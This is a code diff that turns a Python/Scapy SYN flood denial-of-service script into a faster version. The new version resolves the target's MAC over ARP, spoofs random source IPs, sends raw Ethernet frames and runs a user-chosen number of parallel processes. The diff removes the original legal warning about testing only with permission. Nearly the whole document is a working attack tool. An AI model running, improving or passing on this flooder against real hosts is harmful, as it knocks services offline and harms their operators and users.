@@ -1,128 +1,94 @@
 #!/usr/bin/env python3
-# SYN Flood Attack (Denial of Service - DoS)
+# Fast SYN Flood Attack (Denial of Service - DoS)
 
-from scapy.all import *
-import threading
 import random
 import time
 import os
 import signal
 import sys
 import multiprocessing
+from scapy.all import Ether, IP, TCP, ARP, srp, sendp
 
-class SynFloodAttack:
-    def __init__(self, target_ip, target_port, duration):
-        self.target_ip = target_ip
-        self.target_port = int(target_port)
-        self.attack_duration = int(duration)
-        self.running = False
-        self.start_time = None
-        
-        # Attack statistics
-        self.stats = {
-            'syn_packets_sent': 0,
-            'errors': 0,
-            'start_time': None,
-            'end_time': None
-        }
+def get_mac(ip, iface=None):
+    """
+    Resolve the MAC address for a given IP using an ARP request.
+    If iface is provided, it will use that network interface.
+    """
+    arp_request = ARP(pdst=ip)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered, _ = srp(arp_request_broadcast, timeout=1, verbose=0, iface=iface)
+    if answered:
+        return answered[0][1].src
+    else:
+        print(f"❌ Unable to resolve MAC address for {ip}")
+        sys.exit(1)
 
-    def generate_spoofed_ip(self):
-        """Generates a random spoofed IP address."""
-        return ".".join(str(random.randint(1, 254)) for _ in range(4))
+def generate_spoofed_ip():
+    """Generates a random spoofed IPv4 address."""
+    return ".".join(str(random.randint(1, 254)) for _ in range(4))
 
-    def syn_flood(self):
-        """Continuously sends SYN packets to the target."""
-        while self.running:
-            try:
-                # Generate a random source IP
-                src_ip = self.generate_spoofed_ip()
-                
-                # Generate a random source port
-                src_port = random.randint(1024, 65535)
-                
-                # Create SYN packet
-                packet = IP(src=src_ip, dst=self.target_ip) / TCP(sport=src_port, dport=self.target_port, flags="S")
-                
-                # Send the packet
-                send(packet, verbose=0)
-                
-                # Update statistics
-                self.stats['syn_packets_sent'] += 1
-            except Exception as e:
-                self.stats['errors'] += 1
-
-    def start(self):
-        """Starts the attack."""
-        if os.getuid() != 0:
-            print("❌ This script requires root privileges (sudo).")
-            return
-        
-        self.running = True
-        self.stats['start_time'] = time.time()
-        self.start_time = time.time()
-
-        print(f"\n🚀 Starting SYN Flood Attack!")
-        print(f"   • Target IP: {self.target_ip}")
-        print(f"   • Target Port: {self.target_port}")
-        print(f"   • Duration: {self.attack_duration}s\n")
-        
-        # Use multiprocessing to speed up the attack
-        num_processes = 100  # Adjust this number based on your system's capability
-        processes = []
-
-        for _ in range(num_processes):
-            process = multiprocessing.Process(target=self.syn_flood)
-            process.start()
-            processes.append(process)
-
-        # Attack duration loop
+def syn_flood_worker(target_ip, target_port, target_mac, iface, running_flag):
+    """
+    Worker function that continuously sends SYN packets.
+    Uses raw Ethernet frames (via sendp) to bypass the need for
+    an IP-layer MAC resolution on every packet.
+    """
+    while running_flag.value:
         try:
-            while self.running and (time.time() - self.start_time < self.attack_duration):
-                elapsed = time.time() - self.start_time
-                print(
-                    f"\r⏱ {elapsed:.1f}s/{self.attack_duration}s | "
-                    f"SYN Packets Sent: {self.stats['syn_packets_sent']} | "
-                    f"Errors: {self.stats['errors']}",
-                    end='', flush=True
-                )
-                time.sleep(0.05)
-        except KeyboardInterrupt:
-            print("\n🛑 Stopped by user!")
-
-        self.stop()
-
-    def stop(self):
-        """Stops the attack."""
-        self.running = False
-        self.stats['end_time'] = time.time()
-
-        print("\n\n📊 Attack Report:")
-        print(f"   • Duration: {self.stats['end_time'] - self.stats['start_time']:.1f}s")
-        print(f"   • SYN Packets Sent: {self.stats['syn_packets_sent']}")
-        print(f"   • Errors: {self.stats['errors']}\n")
-
-def signal_handler(sig, frame):
-    print("\n🛑 Received termination signal!")
-    attacker.stop()
-    sys.exit(0)
-
-def get_user_input(prompt, default=None):
-    """Gets user input with a default value."""
-    user_input = input(f"{prompt} [{default}]: ")
-    return user_input.strip() if user_input.strip() else default
+            src_ip = generate_spoofed_ip()
+            src_port = random.randint(1024, 65535)
+            packet = Ether(dst=target_mac) / IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
+            sendp(packet, verbose=0, iface=iface)
+        except Exception:
+            # If an error occurs, we just ignore it to keep sending packets.
+            continue
 
 def main():
-    global attacker
+    if os.getuid() != 0:
+        print("❌ This script requires root privileges (sudo).")
+        sys.exit(1)
 
-    target_ip = get_user_input("Enter target IP address")
-    target_port = get_user_input("Enter target port", "80")
-    duration = get_user_input("Enter attack duration in seconds", "30")
+    # Get user input for the attack configuration.
+    target_ip = input("Enter target IP address: ").strip()
+    target_port = int(input("Enter target port (e.g., 80): ").strip())
+    iface = input("Enter network interface (e.g., eth0) [optional]: ").strip() or None
+    duration = int(input("Enter attack duration in seconds: ").strip())
+    num_processes = int(input("Enter number of processes to spawn (e.g., 100): ").strip())
 
-    print("\n⚠️ LEGAL WARNING: Use this script only on networks you own or have permission to test!\n")
+    print("\nResolving target MAC address...")
+    target_mac = get_mac(target_ip, iface)
+    print(f"Target MAC address: {target_mac}")
 
-    attacker = SynFloodAttack(target_ip, target_port, duration)
-    signal.signal(signal.SIGINT, signal_handler)
-    attacker.start()
+    # Create a shared flag to signal processes to stop.
+    manager = multiprocessing.Manager()
+    running_flag = manager.Value('i', 1)
+
+    processes = []
+    print("\n🚀 Starting SYN Flood Attack...")
+    for _ in range(num_processes):
+        p = multiprocessing.Process(target=syn_flood_worker,
+                                    args=(target_ip, target_port, target_mac, iface, running_flag))
+        p.start()
+        processes.append(p)
+
+    start_time = time.time()
+    try:
+        while time.time() - start_time < duration:
+            elapsed = time.time() - start_time
+            print(f"\rElapsed time: {elapsed:.1f}s", end='', flush=True)
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\n🛑 Attack interrupted by user!")
+    finally:
+        running_flag.value = 0
+        for p in processes:
+            p.terminate()
+            p.join()
+
+    print("\n\n📊 Attack finished.")
 
 if __name__ == "__main__":
+    # Set up signal handler for graceful termination.
+    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
     main()
